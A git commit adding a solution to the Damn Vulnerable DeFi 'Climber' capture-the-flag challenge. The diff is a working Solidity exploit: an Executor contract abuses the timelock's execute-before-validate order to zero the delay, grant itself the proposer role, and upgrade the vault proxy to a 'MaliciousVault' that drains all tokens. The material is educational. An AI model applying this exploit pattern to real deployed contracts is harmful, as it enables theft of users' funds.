22a357291670b1620d4dc7697dad138254de81be
focusoor <focusoor@gmail.com>
2024-09-28 16:40:06 +0200

    feat: add Climber solution for dvd

--- damn-vulnerable-defi/test/climber/Climber.t.sol
+++ damn-vulnerable-defi/test/climber/Climber.t.sol
@@ -8,6 +8,79 @@ import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../
 import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 
+import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
+import {AccessControl} from "@openzeppelin/contracts/access/AccessControl.sol";
+
+contract MaliciousVault is UUPSUpgradeable {
+    function withdrawFunds(address _token, address _recipient) external {
+        DamnValuableToken(_token).transfer(_recipient, DamnValuableToken(_token).balanceOf(address(this)));
+    }
+    function _authorizeUpgrade(address) internal override {}
+}
+
+contract Executor {
+    ClimberVault vault;
+    ClimberTimelock timelock;
+    DamnValuableToken token;
+    address recovery;
+
+    address[] targets = new address[](4);
+    uint256[] values = new uint256[](4);
+    bytes[] dataElements = new bytes[](4);
+    bytes32 salt;
+
+    constructor(ClimberVault _vault, ClimberTimelock _timelock, DamnValuableToken _token, address _recovery) {
+        vault = _vault;
+        timelock = _timelock;
+        token = _token;
+        recovery = _recovery;
+    }
+
+    /// @notice Use the fact that operations are executed before the operation id is checked
+    function execute() external {
+        // 1. Update time delay to 0
+        targets[0] = address(timelock);
+        values[0] = 0;
+        dataElements[0] = abi.encodeCall(ClimberTimelock.updateDelay, (uint64(0)));
+
+        // 2. We need to schedule the operation to update the delay to 0
+        // If we set the target to the timelock again, we would need to pass the right params to match the operation id in schedule function
+        // The problem is that we would need to put dataElements encoded in dataElements[1], which is not possible as we will know exact data
+        // only after encoding, making this chicken-egg problem unsolvable
+        // This can be solved by granting the proposer role to this contract, and put encoding for function call inside this contract
+        targets[1] = address(timelock);
+        values[1] = 0;
+        dataElements[1] = abi.encodeCall(AccessControl.grantRole, (PROPOSER_ROLE, address(this)));
+
+        // 3. Schedule a timelock operation to set the delay to 0
+        targets[2] = address(this);
+        values[2] = 0;
+        dataElements[2] = abi.encodeCall(Executor.scheduleOperation, ());
+
+        // 4. Upgrade vault to a new implementation where we can withdraw all tokens
+        // This is possible because timelock contract is the vault owner
+        MaliciousVault newVault = new MaliciousVault();
+        targets[3] = address(vault);
+        values[3] = 0;
+        dataElements[3] = abi.encodeCall(UUPSUpgradeable.upgradeToAndCall,(address(newVault), bytes("")));
+
+        timelock.execute(
+            targets,
+            values,
+            dataElements,
+            salt
+        );
+
+        // address(vault) is proxy address, so this will fallback to withdraw funds in new implementation
+        MaliciousVault(address(vault)).withdrawFunds(address(token), recovery);
+    }
+
+    function scheduleOperation() external {
+        timelock.schedule(targets, values, dataElements, salt);
+    }
+}
+
+
 contract ClimberChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -85,7 +158,8 @@ contract ClimberChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_climber() public checkSolvedByPlayer {
-        
+        Executor executor = new Executor(vault, timelock, token, recovery);
+        executor.execute();
     }
 
     /**
